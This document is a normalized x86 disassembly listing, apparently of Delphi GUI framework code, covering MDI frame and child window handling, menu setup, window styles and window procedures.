cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45c5e0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446940
sub_45c60c
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_446940
xor edx edx
jmp r-xdata
mov eax esi
call sub_45a898
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_45c644
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_4423bc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_446940
sub_45c688
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4424c8
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_45c6dc
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43fa98
sub_45c710
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_460280
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46026c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45c75c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_460280
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46026c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c7ac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_41a30c
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_45c7dc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4493d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_460250
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_460250
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45c7ac
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_460250
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46023c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_41a468
call sub_403234
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46023c
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46023c
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46023c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45c8e0
push ebx
mov ebx eax
mov eax ebx
call sub_45c8d8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42a700
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45c908
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4468f8
mov dl 0x1
mov eax esi
call sub_45cc6c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_45cce8
mov edx eax
mov eax esi
call sub_442d58
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_446a94
mov dl 0x1
mov eax esi
call sub_45bc8c
sub_45c988
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4493d8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_452f6c
mov edi eax
mov eax ebp
call sub_4493d8
push eax
call DrawMenuBar
sub_45ca04
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4207e4
xor edx edx
mov eax ebx
call sub_454904
sub_45ca28
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45c988
mov eax edx
mov edx ebx
call sub_4207e4
sub_45ca50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cc16
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_460280
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4564b8
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46026c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4207e4
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46026c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
mov eax ebx
call sub_4496dc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45c988
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cc1d
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov dl 0x1
mov eax ebx
call sub_45db14
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4493d8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4493d8
mov edx eax
mov eax esi
call sub_4564b8
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4493d8
push eax
call SetMenu
sub_45cc38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45cc24
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_45cc94
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45cc88
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45cd00
push ebx
mov ebx eax
mov eax ebx
call sub_4489b8
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_45cce8
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45cce8
mov edx eax
mov eax ebx
call sub_442d58
mov edx 0xff00000f
mov eax ebx
call sub_442d58
pop ebx
retn
sub_45cd84
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4493d8
push eax
call ShowWindow
sub_45cdc4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_45c7dc
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_45c7dc
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_460250
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46023c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_45c7dc
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46023c
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_460250
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46023c
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff24
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff58
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff24
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff58
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff24
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff58
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff0c
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff58
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff40
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46023c
call sub_45ff24
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_45d118
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45a6cc
mov edx esi
mov eax edi
call sub_45fabc
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_45d1c7 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4461c4
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4461c4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45d329
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45a6dc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov eax ebx
call sub_45dc88
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4425bc
push eax
mov eax ebx
call sub_442600
push eax
mov eax ebx
call sub_4493d8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406e1c
mov [ ebx + 0x254 ] eax
push ebx
push sub_45c274
call sub_4217b8
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_452f6c
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4493d8
push eax
call SetWindowPos
jmp r-xdata
sub_45d476
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45d5a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_446528
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45f994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d5a8
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_45d5b0
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_446794
push 0x0
mov eax ebx
call sub_4493d8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45d5f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446f18
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_4493d8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4493d8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45d658
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d700
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d707
lea eax [ ebp - 0x4 ]
call sub_404008
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax edi
call sub_4599ec
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403430
mov eax ebx
call sub_45da10
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403430
test al al
jne r-xdata
sub_45d710
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_445e7c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_445e7c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45d658
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45d758
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45d658
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_45d77c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41a604
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41a4e4
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41a604
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41a4e4
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45d9ec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_4493d8
mov dx 0xb000
call sub_4597b4
test al al
jne r-xdata
call sub_4493d8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4597b4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
